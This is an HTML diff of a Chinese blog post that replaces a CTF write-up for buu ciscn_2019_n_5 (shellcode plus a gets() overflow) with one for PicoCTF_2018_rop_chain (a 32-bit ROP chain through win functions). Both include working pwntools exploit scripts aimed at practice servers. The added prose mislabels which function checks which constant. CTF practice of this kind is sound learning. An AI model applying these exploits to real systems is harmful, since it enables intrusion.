@@ -3,7 +3,7 @@
   <head>
     <meta charset="utf-8" >
 
-<title>每日1+（认怂了） | nianchu</title>
+<title>不更新怕被删博客 | nianchu</title>
 
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
 
@@ -24,11 +24,12 @@
 
 
 
-    <meta name="description" content="buu ciscn_2019_n_5
-在buu上拿到附件 checksec一下
-    Arch:     amd64-64-little
-    RELRO:    Partial RELRO
-    Stack:    No canar..." />
+    <meta name="description" content="
+最近特别少写题，就来buu按顺序一题一题刷下去吧
+##buu PicoCTF_2018_rop_chain
+
+一题简单的ROP，32位系统且开了Partial和NX保护
+int __cdecl main(int argc, const c..." />
     <meta name="keywords" content="" />
   </head>
   <body>
@@ -100,60 +101,108 @@
       <div class="main-container">
         <div class="content-container" data-aos="fade-up">
           <div class="post-detail">
-            <h2 class="post-title">每日1+（认怂了）</h2>
-            <div class="post-date">2021-08-03</div>
+            <h2 class="post-title">不更新怕被删博客</h2>
+            <div class="post-date">2021-12-02</div>
             
             <div class="post-content" v-pre>
-              <h2 id="buu-ciscn_2019_n_5">buu ciscn_2019_n_5</h2>
-<p>在buu上拿到附件 checksec一下</p>
-<pre><code>    Arch:     amd64-64-little
-    RELRO:    Partial RELRO
-    Stack:    No canary found
-    NX:       NX disabled
-    PIE:      No PIE (0x400000)
-    RWX:      Has RWX segments
-</code></pre>
-<p>发现这是64位系统 没开任何保护<br>
-打开ida64  找到main函数按F5获得伪代码</p>
+              <h1 id=""></h1>
+<p>最近特别少写题，就来buu按顺序一题一题刷下去吧<br>
+##buu PicoCTF_2018_rop_chain</p>
+<h3 id="-2"></h3>
+<p>一题简单的ROP，32位系统且开了Partial和NX保护</p>
 <pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
 {
-  char text[30]; // [rsp+0h] [rbp-20h] BYREF
+ int v4; // [esp+Ch] [ebp-Ch]
 
-  setvbuf(stdout, 0LL, 2, 0LL);
-  puts(&quot;tell me your name&quot;);
-  read(0, name, 0x64uLL);
-  puts(&quot;wow~ nice name!&quot;);
-  puts(&quot;What do you want to say to me?&quot;);
-  gets(text);
-  return 0;
+ setvbuf(_bss_start, 0, 2, 0);
+ v4 = getegid();
+ setresgid(v4, v4, v4);
+ vuln();
+ return 0;
+}
+
+</code></pre>
+<pre><code>char *vuln()
+{
+ char s[24]; // [esp+0h] [ebp-18h] BYREF
+
+ printf(&quot;Enter your input&gt; &quot;);
+ return gets(s);
 }
 </code></pre>
-<p>发现第一次让我们输入名字 然后限制长度为0x64  并且name是在.bss段上<br>
-第二次是利用gets函数，没有限制长度，可以用gets函数进行溢出<br>
-我们得思路是:<br>
-第一个漏洞写入shellcode<br>
-然后第二个漏洞溢出去到name参数去然后执行shellcode拿到shell<br>
+<p>一层一层走下去发现有gets()函数，看到这个函数基本上就可以判定是栈溢出，没有限制长度，看看有没有后门函数或者是Sys函数</p>
+<pre><code>int __cdecl flag(int a1)
+{
+  char s[48]; // [esp+Ch] [ebp-3Ch] BYREF
+  FILE *stream; // [esp+3Ch] [ebp-Ch]
+  stream = fopen(&quot;flag.txt&quot;, &quot;r&quot;);
+  if ( !stream )
+  {
+    puts(
+      &quot;Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.&quot;);
+    exit(0);
+  }
+  fgets(s, 48, stream);
+  if ( win1 &amp;&amp; win2 &amp;&amp; a1 == -559039827 )
+    return printf(&quot;%s&quot;, s);
+  if ( win1 &amp;&amp; win2 )
+    return puts(&quot;Incorrect Argument. Remember, you can call other functions in between each win function!&quot;);
+  if ( win1 || win2 )
+    return puts(&quot;Nice Try! You're Getting There!&quot;);
+  return puts(&quot;You won't get the flag that easy..&quot;);
+}
+void win_function1()
+{
+  win1 = 1;
+}
+int __cdecl win_function2(int a1)
+{
+  int result; // eax
+  result = (unsigned __int8)win1;
+  if ( win1 &amp;&amp; a1 == -1163220307 )
+  {
+    win2 = 1;
+  }
+  else if ( win1 )
+  {
+    result = puts(&quot;Wrong Argument. Try Again.&quot;);
+  }
+  else
+  {
+    result = puts(&quot;Nope. Try a little bit harder.&quot;);
+  }
+  return result;
+}
+</code></pre>
+<p>发现只要在fun2中a1==-559039827且fun1中a1=-1163220307<br>
 exp:</p>
 <pre><code>from pwn import*
 
-q=remote('node4.buuoj.cn',25042)
+q=remote('node4.buuoj.cn',29409)
+#q=process('./PicoCTF_2018_rop_chain')
 
-q.sendlineafter('tell me your name',asm(shellcraft.sh()))
+fun1=0x080485CB
+fun2=0x080485D8
+flag=0x0804862B
 
-payload='a'*0x28+p64(0x601080)
-q.sendlineafter('What do you want to say to me?',payload)
+payload='a'*0x1c
+payload+=p32(fun1)
+payload+=p32(fun2)
+payload+=p32(flag)+p32(0xBAAAAAAD)+p32(0XDEADBAAD)
 
+q.sendline(payload)
 q.interactive()
 </code></pre>
+<p>因为a1等于的是负数，所以得让他变成16进制的补码</p>
 
             </div>
             
             
               <div class="next-post">
                 <div class="next">下一篇</div>
-                <a href="https://cc-nianchu.github.io/post/mei-ri-3/">
+                <a href="https://cc-nianchu.github.io/post/ji-chu-xie-lou-libc-buu/">
                   <h3 class="post-title">
-                    每日3+
+                    基础泄漏libc  buu
                   </h3>
                 </a>
               </div>
